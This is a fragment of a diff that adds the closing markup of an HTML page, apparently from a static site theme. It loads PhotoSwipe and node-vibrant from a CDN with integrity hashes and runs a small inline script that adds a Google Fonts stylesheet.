+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
